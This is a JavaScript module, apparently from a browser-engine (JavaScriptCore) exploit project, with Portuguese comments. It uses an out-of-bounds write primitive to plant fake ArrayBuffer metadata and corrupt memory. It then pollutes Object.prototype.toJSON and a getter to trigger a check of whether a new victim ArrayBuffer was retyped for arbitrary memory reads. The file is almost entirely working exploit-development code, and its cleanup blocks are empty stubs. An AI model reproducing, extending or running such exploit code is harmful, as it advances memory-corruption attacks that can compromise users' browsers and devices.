// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForExploit";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null };

// Metadados sombra que gostaríamos de usar
const ADDR_TARGET_FOR_SHADOW_AB = new AdvancedInt64(0x1, 0x0); // Onde o AB sombra leria
const SIZE_TARGET_FOR_SHADOW_AB = new AdvancedInt64(0x1000, 0x0); // Tamanho do AB sombra (4096 bytes)

// Variável para manter a referência ao ArrayBuffer vítima "fresco"
let fresh_victim_ab_ref;

class CheckpointObjectForExploit {
    constructor(id) {
        this.id = `ExploitCheckpoint-${id}`;
    }
}

export function toJSON_TriggerExploitGetter() {
    const FNAME_toJSON = "toJSON_TriggerExploitGetter";
    if (this instanceof CheckpointObjectForExploit) {
        logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        } catch (e) {
            logS3(`toJSON: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    return this.id; // Retorno simples
}

export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeFreshVictimABTest"; // Nome interno do teste
    logS3(`--- Iniciando Teste com ArrayBuffer Vítima "Fresco" ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    fresh_victim_ab_ref = null; // Reseta a referência
    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null };

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
        logS3("Offsets críticos não definidos. Abortando.", "critical", FNAME_TEST);
        current_test_results.message = "Offsets críticos não definidos.";
        return;
    }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            current_test_results = { success: false, message: "Falha ao inicializar OOB.", error: "OOB env not set" };
            logS3(current_test_results.message, "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Plantar "Metadados Sombra" (para um hipotético ArrayBufferContents)
        //    no início do buffer de dados do oob_array_buffer_real.
        //    Este é o ArrayBufferContents FALSO que gostaríamos que um AB vítima usasse.
        const shadow_contents_offset_in_oob_data = 0x0;
        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, SIZE_TARGET_FOR_SHADOW_AB, 8);
        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, ADDR_TARGET_FOR_SHADOW_AB, 8);
        logS3(`Metadados sombra (ArrayBufferContents falsos) plantados em oob_data[0]: ptr=${ADDR_TARGET_FOR_SHADOW_AB.toString(true)}, size=${SIZE_TARGET_FOR_SHADOW_AB.toString(true)}`, "info", FNAME_TEST);

        // 2. Realizar a escrita OOB "gatilho" que causa a chamada anômala do getter
        const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
        oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
        logS3(`Escrita OOB gatilho em ${toHex(corruption_trigger_offset_abs)} do oob_data completada.`, "info", FNAME_TEST);

        // 3. Criar um ArrayBuffer Vítima "Fresco" *APÓS* a escrita OOB gatilho
        //    A esperança é que o estado do alocador possa estar alterado.
        const victim_ab_size = 256;
        logS3(`Criando ArrayBuffer vítima "fresco" (fresh_victim_ab_ref) com tamanho ${victim_ab_size}...`, "info", FNAME_TEST);
        fresh_victim_ab_ref = new ArrayBuffer(victim_ab_size);
        logS3(`fresh_victim_ab_ref criado. byteLength inicial: ${fresh_victim_ab_ref.byteLength}`, "info", FNAME_TEST);


        // 4. Configurar o getter e poluir para acionar o ponto de verificação
        const checkpoint_obj = new CheckpointObjectForExploit(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForExploit.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForExploit.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() {
                getter_called_flag = true;
                const FNAME_GETTER = "FreshVictimAB_Getter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Inspecionando fresh_victim_ab_ref...`, "vuln", FNAME_GETTER);
                current_test_results = { success: false, message: "Getter chamado, inspecionando fresh_victim_ab_ref.", error: null };

                if (!fresh_victim_ab_ref) {
                    logS3("DENTRO DO GETTER: fresh_victim_ab_ref é null/undefined!", "error", FNAME_GETTER);
                    current_test_results.message = "fresh_victim_ab_ref não estava disponível no getter.";
                    return 0xDEADDEAD;
                }

                try {
                    logS3(`DENTRO DO GETTER: Verificando fresh_victim_ab_ref.byteLength (originalmente ${victim_ab_size})...`, "info", FNAME_GETTER);
                    const currentVictimLength = fresh_victim_ab_ref.byteLength;
                    logS3(`DENTRO DO GETTER: fresh_victim_ab_ref.byteLength atual: ${currentVictimLength}`, "info", FNAME_GETTER);

                    if (currentVictimLength === SIZE_TARGET_FOR_SHADOW_AB.low()) {
                        logS3(`DENTRO DO GETTER: SUCESSO ESPECULATIVO! fresh_victim_ab_ref.byteLength (${currentVictimLength}) CORRESPONDE ao tamanho dos metadados sombra (${SIZE_TARGET_FOR_SHADOW_AB.low()})!`, "vuln", FNAME_GETTER);
                        logS3(`DENTRO DO GETTER: Tentando criar DataView sobre fresh_victim_ab_ref e ler de offset 0 (deveria ler de ${ADDR_TARGET_FOR_SHADOW_AB.toString(true)})...`, "info", FNAME_GETTER);
                        const dvOnVictim = new DataView(fresh_victim_ab_ref);
                        let val = dvOnVictim.getUint32(0, true); // Tenta ler de ADDR_TARGET_FOR_SHADOW_AB (0x1)
                        current_test_results = { success: true, message: `fresh_victim_ab_ref RE-TIPADO! byteLength OK. Lido de [${ADDR_TARGET_FOR_SHADOW_AB.toString(true)}]: ${toHex(val)} SEM ERRO.`, error: null };
                        logS3(`DENTRO DO GETTER: Lido de fresh_victim_ab_ref (re-tipado): ${toHex(val)}.`, "leak", FNAME_GETTER);
                    } else {
                        logS3(`DENTRO DO GETTER: fresh_victim_ab_ref.byteLength (${currentVictimLength}) NÃO corresponde ao tamanho sombra. Comportamento normal.`, "warn", FNAME_GETTER);
                        // Tentar usar o fresh_victim_ab normalmente para ver se ele está minimamente funcional
                        const dvNormal = new DataView(fresh_victim_ab_ref);
                        dvNormal.setUint32(0, 0xBADDBADD, true);
                        if (dvNormal.getUint32(0, true) === 0xBADDBADD) {
                            logS3("DENTRO DO GETTER: fresh_victim_ab_ref funciona normalmente para escrita/leitura.", "good", FNAME_GETTER);
                        } else {
                            logS3("DENTRO DO GETTER: ERRO ao escrever/ler em fresh_victim_ab_ref (comportamento normal).", "error", FNAME_GETTER);
                        }
                        current_test_results.message = `fresh_victim_ab_ref manteve tamanho original (${currentVictimLength}). Funcionalidade normal verificada.`;
                    }

                } catch (e) {
                    logS3(`DENTRO DO GETTER: ERRO ao operar em fresh_victim_ab_ref: ${e.message}`, "error", FNAME_GETTER);
                    // Se o byteLength bateu com o dos metadados sombra E AQUI DEU ERRO, é o esperado para 0x1
                    if (fresh_victim_ab_ref && fresh_victim_ab_ref.byteLength === SIZE_TARGET_FOR_SHADOW_AB.low() &&
                        (String(e.message).toLowerCase().includes("rangeerror") || String(e.message).toLowerCase().includes("memory access"))) {
                        logS3(`DENTRO DO GETTER: O erro '${e.message}' é o CRASH CONTROLADO esperado ao tentar ler de ${ADDR_TARGET_FOR_SHADOW_AB.toString(true)} via fresh_victim_ab_ref!`, "vuln", FNAME_GETTER);
                        current_test_results = { success: true, message: `fresh_victim_ab_ref RE-TIPADO e CRASH CONTROLADO '${e.message}' ao ler de ${ADDR_TARGET_FOR_SHADOW_AB.toString(true)}.`, error: String(e) };
                    } else {
                        current_test_results = { success: false, message: `Erro inesperado com fresh_victim_ab_ref: ${e.message}`, error: String(e) };
                    }
                }
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerExploitGetter, writable: true, enumerable: false, configurable: true});
        toJSONPollutionApplied = true;
        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError) };
    } finally {
        // Restauração (mantida)
        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { /* ... */ }
        if (getterPollutionApplied && CheckpointObjectForExploit.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { /* ... */ }
        logS3("Limpeza finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE VÍTIMA FRESCA: ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE VÍTIMA FRESCA: Getter chamado, mas sem sucesso. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
    } else {
        logS3("RESULTADO TESTE VÍTIMA FRESCA: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }
    logS3(`  Detalhes finais: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    fresh_victim_ab_ref = null; // Limpa a referência global
    logS3(`--- Teste com ArrayBuffer Vítima "Fresco" Concluído ---`, "test", FNAME_TEST);
}
